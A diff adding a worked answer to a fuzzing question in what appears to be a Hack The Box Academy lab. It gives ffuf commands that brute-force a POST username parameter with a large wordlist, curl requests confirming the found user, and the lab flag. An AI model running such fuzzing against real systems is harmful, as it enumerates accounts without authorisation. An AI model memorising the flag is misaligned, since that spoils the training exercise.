@@ -40,3 +40,9 @@ Question 4 - In the page from the previous question, you should be able to find 
 
 
 Question 5 - Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
+1) ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:45812/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
+2) ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:45812/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 
+3) output: harry & Harry 
+4) curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=harry" http://faculty.academy.htb:45812/courses/linux-security.php7
+5) curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=harry" http://faculty.academy.htb:45812/courses/linux-security.php7
+3<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
